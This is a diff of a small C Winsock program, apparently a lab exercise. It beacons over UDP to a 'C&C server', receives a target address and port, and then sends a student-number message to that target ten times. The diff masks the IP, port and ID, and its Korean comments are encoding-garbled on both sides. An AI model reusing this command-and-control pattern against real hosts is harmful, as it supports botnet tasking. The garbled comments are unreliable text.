@@ -4,7 +4,7 @@
 
 #define BUFFER_SIZE 1024
 
-#pragma comment (lib,"ws2_32.lib") //¶óÀÌºê·¯¸® ¸µÅ©
+#pragma comment (lib,"ws2_32.lib") //ë¼ì´ë¸ŒëŸ¬ë¦¬ ë§í¬
 
 void main(void)
 
@@ -13,8 +13,8 @@ void main(void)
 
 	SOCKET   ClientSocket;
 
-	SOCKADDR_IN  CnCServer; //C&C¼­¹ö
-	SOCKADDR_IN  AttackServer; //°ø°İÇÒ ¼­¹ö
+	SOCKADDR_IN  CnCServer; //C&Cì„œë²„
+	SOCKADDR_IN  AttackServer; //ê³µê²©í•  ì„œë²„
 
 	int   CnCServer_Size;
 	int   AttackServer_Size;
@@ -22,37 +22,37 @@ void main(void)
 	int   Recv_Size;
 	int   Send_Size;
 
-	char   Buffer[BUFFER_SIZE] = { "IMHACKER_2016111566" }; //C&C ¼­¹ö·Î Àü¼ÛÇÒ ¸Ş½ÃÁö
+	char   Buffer[BUFFER_SIZE] = { "**********" }; //C&C ì„œë²„ë¡œ ì „ì†¡í•  ë©”ì‹œì§€
 
-	USHORT   ServerPort = 10004; //C&C ¼­¹ö Æ÷Æ®¹øÈ£
+	USHORT   ServerPort = *****; //C&C ì„œë²„ í¬íŠ¸ë²ˆí˜¸
 
 
 
-	if (WSAStartup(0x202, &wsaData) == SOCKET_ERROR) //WS2_32.dll »ç¿ë ½ÃÀÛ
+	if (WSAStartup(0x202, &wsaData) == SOCKET_ERROR) //WS2_32.dll ì‚¬ìš© ì‹œì‘
 	{
-		printf("WinSock ÃÊ±âÈ­ºÎºĞ¿¡¼­ ¹®Á¦ ¹ß»ı.\n");
-		WSACleanup(); //¿À·ù°¡ ³ª¸é WS2_32.dll »ç¿ë ³¡
+		printf("WinSock ì´ˆê¸°í™”ë¶€ë¶„ì—ì„œ ë¬¸ì œ ë°œìƒ.\n");
+		WSACleanup(); //ì˜¤ë¥˜ê°€ ë‚˜ë©´ WS2_32.dll ì‚¬ìš© ë
 		exit(0);
 	}
 
-	//CncServer ¸Ş¸ğ¸®ÀÇ ¸ğµç ³»¿ëÀ» 0À¸·Î ¼³Á¤
+	//CncServer ë©”ëª¨ë¦¬ì˜ ëª¨ë“  ë‚´ìš©ì„ 0ìœ¼ë¡œ ì„¤ì •
 	memset(&CnCServer, 0, sizeof(CnCServer));
-	//AttackServer ¸Ş¸ğ¸®ÀÇ ¸ğµç ³»¿ëÀ» 0À¸·Î ¼³Á¤
+	//AttackServer ë©”ëª¨ë¦¬ì˜ ëª¨ë“  ë‚´ìš©ì„ 0ìœ¼ë¡œ ì„¤ì •
 	memset(&AttackServer, 0, sizeof(AttackServer));
 
 	
-	CnCServer.sin_family = AF_INET; //µ¥ÀÌÅÍ Àü¼Û¹æ½ÄÀ» IPv4·Î ÁöÁ¤
+	CnCServer.sin_family = AF_INET; //ë°ì´í„° ì „ì†¡ë°©ì‹ì„ IPv4ë¡œ ì§€ì •
 
-	CnCServer.sin_addr.s_addr = inet_addr("114.70.37.17"); //C&C ¼­¹ö ÁÖ¼Ò
+	CnCServer.sin_addr.s_addr = inet_addr("**********"); //C&C ì„œë²„ ì£¼ì†Œ
 
-	CnCServer.sin_port = htons(ServerPort); //C&C ¼­¹ö Æ÷Æ®¹øÈ£
+	CnCServer.sin_port = htons(ServerPort); //C&C ì„œë²„ í¬íŠ¸ë²ˆí˜¸
 
 
 	ClientSocket = socket(AF_INET, SOCK_DGRAM, 0);
 
 	if (ClientSocket == INVALID_SOCKET)
 	{
-		printf("¼ÒÄÏÀ» »ı¼ºÇÒ¼ö ¾ø½À´Ï´Ù.\n");
+		printf("ì†Œì¼“ì„ ìƒì„±í• ìˆ˜ ì—†ìŠµë‹ˆë‹¤.\n");
 		closesocket(ClientSocket);
 		WSACleanup();
 		exit(0);
@@ -63,39 +63,39 @@ void main(void)
 
 
 
-	//---------- ÆĞÅ¶¼Û½Å ----------
+	//---------- íŒ¨í‚·ì†¡ì‹  ----------
 
 	Send_Size = sendto(ClientSocket, Buffer, BUFFER_SIZE, 0,
 
 		(struct sockaddr*) &CnCServer, CnCServer_Size);
 
-	//---------- ÆĞÅ¶¼Û½Å½Ã ¿¡·¯Ã³¸® ----------
+	//---------- íŒ¨í‚·ì†¡ì‹ ì‹œ ì—ëŸ¬ì²˜ë¦¬ ----------
 
-	if (Send_Size<0) { printf("µ¥ÀÌÅÍ ¼Û½Å ½ÇÆĞ.\n"); exit(0); }
+	if (Send_Size<0) { printf("ë°ì´í„° ì†¡ì‹  ì‹¤íŒ¨.\n"); exit(0); }
 
-	//---------- ¼Û½ÅÇÑ ÆĞÅ¶ Ãâ·Â ----------
+	//---------- ì†¡ì‹ í•œ íŒ¨í‚· ì¶œë ¥ ----------
 
 	//printf("Message to %s \n", inet_ntoa(CnCServer.sin_addr));
 
 	printf("Send: %s \n", Buffer);
 
 
-	//Buffer ¸Ş¸ğ¸®ÀÇ ¸ğµç ³»¿ëÀ» 0À¸·Î ¼³Á¤
+	//Buffer ë©”ëª¨ë¦¬ì˜ ëª¨ë“  ë‚´ìš©ì„ 0ìœ¼ë¡œ ì„¤ì •
 	memset(Buffer, 0, BUFFER_SIZE);
 
 
 
-	//---------- ÆĞÅ¶¼ö½Å ----------
+	//---------- íŒ¨í‚·ìˆ˜ì‹  ----------
 
 	Recv_Size = recvfrom(ClientSocket, Buffer, BUFFER_SIZE, 0,
 
 		(struct sockaddr*) &CnCServer, &CnCServer_Size);
 
-	//---------- ÆĞÅ¶¼ö½Å½Ã ¿¡·¯Ã³¸® ----------
+	//---------- íŒ¨í‚·ìˆ˜ì‹ ì‹œ ì—ëŸ¬ì²˜ë¦¬ ----------
 
-	if (Recv_Size<0) { printf("µ¥ÀÌÅÍ ¼ö½Å ½ÇÆĞ.\n"); exit(0); }
+	if (Recv_Size<0) { printf("ë°ì´í„° ìˆ˜ì‹  ì‹¤íŒ¨.\n"); exit(0); }
 
-	//---------- ¼ö½ÅÇÑ ÆĞÅ¶ Ãâ·Â ----------
+	//---------- ìˆ˜ì‹ í•œ íŒ¨í‚· ì¶œë ¥ ----------
 
 	//printf("Message from %s \n", inet_ntoa(CnCServer.sin_addr));
 
@@ -103,48 +103,48 @@ void main(void)
 
 
 
-	//---------- ¹Ş¾Æ¿Â µ¥ÀÌÅÍ¿¡¼­ °ø°İÁöÀÇ IP¿Í Æ÷Æ®¹øÈ£ ºĞ¸®ÇÏ¿© ÀúÀå ----------
+	//---------- ë°›ì•„ì˜¨ ë°ì´í„°ì—ì„œ ê³µê²©ì§€ì˜ IPì™€ í¬íŠ¸ë²ˆí˜¸ ë¶„ë¦¬í•˜ì—¬ ì €ì¥ ----------
 
 	char *context = NULL;
 	char *data[3];
 
 	data[0] = strtok_s(Buffer, "_", &context); //OKAY
-	data[1] = strtok_s(NULL, ":", &context); //°ø°İÁö ¼­¹ö ÁÖ¼Ò
-	data[2] = strtok_s(NULL, " ", &context); //°ø°İÁö ¼­¹ö Æ÷Æ®¹øÈ£
+	data[1] = strtok_s(NULL, ":", &context); //ê³µê²©ì§€ ì„œë²„ ì£¼ì†Œ
+	data[2] = strtok_s(NULL, " ", &context); //ê³µê²©ì§€ ì„œë²„ í¬íŠ¸ë²ˆí˜¸
 	
-	USHORT   A_ServerPort = atoi(data[2]); //°ø°İÁö ¼­¹ö Æ÷Æ®¹øÈ£
+	USHORT   A_ServerPort = atoi(data[2]); //ê³µê²©ì§€ ì„œë²„ í¬íŠ¸ë²ˆí˜¸
 
-	AttackServer.sin_family = AF_INET; //µ¥ÀÌÅÍ Àü¼Û¹æ½ÄÀ» IPv4·Î ÁöÁ¤
+	AttackServer.sin_family = AF_INET; //ë°ì´í„° ì „ì†¡ë°©ì‹ì„ IPv4ë¡œ ì§€ì •
 
-	AttackServer.sin_addr.s_addr = inet_addr(data[1]); //°ø°İÁö ¼­¹ö ÁÖ¼Ò
+	AttackServer.sin_addr.s_addr = inet_addr(data[1]); //ê³µê²©ì§€ ì„œë²„ ì£¼ì†Œ
 
-	AttackServer.sin_port = htons(A_ServerPort); //°ø°İÁö ¼­¹ö Æ÷Æ®¹øÈ£
+	AttackServer.sin_port = htons(A_ServerPort); //ê³µê²©ì§€ ì„œë²„ í¬íŠ¸ë²ˆí˜¸
 
 	AttackServer_Size = sizeof(AttackServer);
 
 
-	char   AttackBuffer[BUFFER_SIZE] = { "2016111566" }; //°ø°İÁö ¼­¹ö·Î Àü¼ÛÇÒ ¸Ş½ÃÁö
+	char   AttackBuffer[BUFFER_SIZE] = { "*****" }; //ê³µê²©ì§€ ì„œë²„ë¡œ ì „ì†¡í•  ë©”ì‹œì§€
 
 
 
-	//---------- ÇĞ¹ø 10È¸ Àü¼Û ----------
+	//---------- í•™ë²ˆ 10íšŒ ì „ì†¡ ----------
 
-	printf("IP: %s \n", inet_ntoa(AttackServer.sin_addr)); //°ø°İÁö IP Ãâ·Â
-	printf("Port: %d \n", A_ServerPort); //°ø°İÁö Æ÷Æ®¹øÈ£ Ãâ·Â
+	printf("IP: %s \n", inet_ntoa(AttackServer.sin_addr)); //ê³µê²©ì§€ IP ì¶œë ¥
+	printf("Port: %d \n", A_ServerPort); //ê³µê²©ì§€ í¬íŠ¸ë²ˆí˜¸ ì¶œë ¥
 
-	for (int i = 0; i < 10; i++) { //10È¸ ¹İº¹
+	for (int i = 0; i < 10; i++) { //10íšŒ ë°˜ë³µ
 		Send_Size = sendto(ClientSocket, AttackBuffer, BUFFER_SIZE, 0,
 
 			(struct sockaddr*) &AttackServer, AttackServer_Size);
 
-		if (Send_Size<0) { printf("µ¥ÀÌÅÍ ¼Û½Å ½ÇÆĞ.\n"); exit(0); }
+		if (Send_Size<0) { printf("ë°ì´í„° ì†¡ì‹  ì‹¤íŒ¨.\n"); exit(0); }
 
 		printf("Send: %s \n", AttackBuffer);
 	}
 
 
 
-	closesocket(ClientSocket); //¼ÒÄÏÀ» ´İ½À´Ï´Ù.
+	closesocket(ClientSocket); //ì†Œì¼“ì„ ë‹«ìŠµë‹ˆë‹¤.
 
-	WSACleanup(); //ÀÌÁ¦ WS2_32.dll »ç¿ëÀ» ³¡³»°Ú´Ù°í È£Ãâ
+	WSACleanup(); //ì´ì œ WS2_32.dll ì‚¬ìš©ì„ ëë‚´ê² ë‹¤ê³  í˜¸ì¶œ
 }
